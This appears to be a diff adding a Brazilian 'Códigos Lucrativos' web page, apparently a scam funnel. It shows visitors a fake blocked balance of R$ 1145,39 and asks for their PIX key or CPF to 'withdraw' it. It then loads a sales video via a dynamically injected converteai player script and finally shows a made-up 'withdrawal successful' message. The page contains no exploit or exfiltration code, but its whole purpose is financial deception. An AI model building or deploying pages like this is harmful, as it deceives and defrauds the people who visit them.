@@ -1,0 +1,164 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha512-3gJwYpMe3QewGELv8k/BX9vcqhryRdzRMxVfq6ngyWXwo03GFEzjsUm8Q7RZcHPHksttq7/GFoxjCVUjkjvPdw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script> 
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/x-icon" href="./Logo-Wolf-Métodos.png">
+    <script src="https://kit.fontawesome.com/021532d534.js" crossorigin="anonymous"></script>
+    <script src=""></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script> 
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.2.1/dist/css/bootstrap.min.css" integrity="sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS" crossorigin="anonymous">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js" integrity="sha512-0XDfGxFliYJPFrideYOoxdgNIvrwGTLnmK20xZbCAvPfLGQMzHUsaqZK8ZoH+luXGRxTrS46+Aq400nCnAT0/w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.6/jquery.inputmask.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js" integrity="sha512-pHVGpX7F/27yZ0ISY+VVjyULApbDlD0/X0rgGbTqCE7WFW5MezNTWG/dnhtbBuICzsd0WQPgpE4REBLv+UqChw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <title>Códigos Lucrativos</title>
+    <script>
+        function formatar(mascara, documento) {
+            let i = documento.value.length;
+            let saida = '#';
+            let texto = mascara.substring(i);
+            while (texto.substring(0, 1) != saida && texto.length ) {
+            documento.value += texto.substring(0, 1);
+            i++;
+            texto = mascara.substring(i);
+            }
+        }
+
+        function gerarPix() {
+            if ($(".cpf").val().length > 3 || $(".phone").val().length > 3) {
+              $(".pop").removeClass('d-none');
+          var playerDiv = '<div id="vid_663015f6ef68be000c95679b" style="position:relative;width:100%;padding:56.25% 0 0;">' +
+    '<img id="thumb_663015f6ef68be000c95679b" src="https://images.converteai.net/e41c52c0-1591-4eaf-8d8f-6bb645a4e0b7/players/663015f6ef68be000c95679b/thumbnail.jpg" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;display:block;">' +
+    '<div id="backdrop_663015f6ef68be000c95679b" style="position:absolute;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);"></div>' +
+    '</div>';
+
+var script = '<script type="text/javascript" id="scr_663015f6ef68be000c95679b">' +
+    'var s=document.createElement("script");' +
+    's.src="https://scripts.converteai.net/e41c52c0-1591-4eaf-8d8f-6bb645a4e0b7/players/663015f6ef68be000c95679b/player.js";' +
+    's.async=true;' +
+    'document.head.appendChild(s);';
+    $('.vtub').html(playerDiv + script);
+
+            } else {
+                alert('Preencha o pix!');
+            }
+        };
+
+        $(document).ready(function() {
+            localStorage.setItem('menu', true);
+             console.log('asd')
+            $('.pix').click(function(){
+                $(this).addClass("active")
+                $(".pix").not(this).removeClass('active')
+            });
+
+            $('.btnModal').click(function(){
+                setTimeout(() => {
+                    $("#modalSuccess").modal('show');
+                    $("#exampleModal").modal('hide');
+
+                }, 5000);
+            });
+
+
+
+            $('.option').click(function() {
+                $('.option').removeClass('selected');
+                $(this).addClass("selected");
+                option = $(this).attr('id');
+                console.log(option);
+
+                if (option == 'phone') {
+                    $('.phone').removeClass('d-none');
+                    $('.cpf').addClass('d-none');
+                } else {
+                    $('.cpf').removeClass('d-none');
+                    $('.phone').addClass('d-none');
+                }
+            });
+
+        });
+
+    </script>
+</head>
+<body>
+    <div class="pop d-none">
+        <div class="pop-out-foto" style="border: 1px solid grey; padding: 10px 5px;">
+          <div class="bloqueado">
+            <h4 style="font-size: 20px; font-weight: bold;">SALDO BLOQUEADO</h4>
+            <h1 style="color: red; font-size: 24px; font-weight: bold;">R$ 1145,39</h1>
+          </div>
+          <p>Assista o vídeo abaixo para aprender a sacar.</p>
+          <div class="vtub">
+  
+          </div>
+          <button class="btn-pop-out-foto" style="border: 0px;" onclick="window.location.href = 'https://google.com.br'">CONCLUIR SAQUE</button>
+        </div>
+      </div>
+    <header>
+        <img src="./codluc-1.png" alt="">
+        <div>
+            <span>R$</span>
+            <span id="money">1145</span>,39
+        </div>
+    </header>
+    <div class="card-grey">
+        Saldo Atualizado
+        
+        <p style="font-size: 15px; margin-bottom: 0px;">REALIZE O SAQUE AGORA.</p>
+    </div>
+
+
+    <div class="post">
+      <div class="container saque" style="flex-direction: column;">
+          <p style="font-size: 13px; text-align: center; margin: 35px 0px 10px 0px;">
+              <i class="fa-brands fa-pix" style="color: rgb(71, 185, 128);"></i>
+              Selecione sua chave PIX
+          </p>
+          <div class="wrapperOption">
+              <div class="option selected" id="phone">
+                  <i class="fa-solid fa-mobile-screen-button"></i>
+                  Celular
+              </div>
+
+              <div class="option" id="cpf">
+                  <i class="fa-solid fa-address-card"></i>
+                  CPF
+              </div>
+          </div>
+          <input class="phone " type="tel" placeholder="Digite seu número aqui (55 999999999)" onkeypress="formatar('(##) #####-####',this)" maxlength="15">
+          <input class="cpf d-none" placeholder="Digite seu CPF aqui..." onkeypress="formatar('###.###.###-##',this)" maxlength="14">
+          <button class="btn" onclick="gerarPix();">REALIZAR SAQUE</button>
+      </div>
+  </div>
+
+      <div class="modal fade" id="modalSuccess" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+          <div class="modal-content">
+           
+            <div class="modal-body" style="display: flex; flex-direction: column; justify-content: center; align-items: center; gap: 30px; text-align: center;">
+              <h3>Parabéns!!!</h3> 
+              <img src="./emblemok_103757.png" width="100px" height="100%" alt="">
+                <p style="font-size: 17px; font-weight: bold;">O saque foi realizado com sucesso e estará disponível em breve.</p>
+            </div>
+            
+          </div>
+        </div>
+      </div>
+      <footer >
+        <div>
+            <i class="fa-solid fa-house" onclick="window.location.href= './quiz-1.html'"></i>
+            <i class="fa-solid fa-clapperboard" onclick="window.location.href= 'google.com'"></i>
+            <i class="fa-regular fa-star" onclick="window.location.href= 'google.com'"></i>
+            <i class="fa-solid fa-wallet" onclick="window.location.href= './saque.html'"></i>
+            </div>
+    </footer>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js" integrity="sha512-pHVGpX7F/27yZ0ISY+VVjyULApbDlD0/X0rgGbTqCE7WFW5MezNTWG/dnhtbBuICzsd0WQPgpE4REBLv+UqChw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>    
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+</html>
+
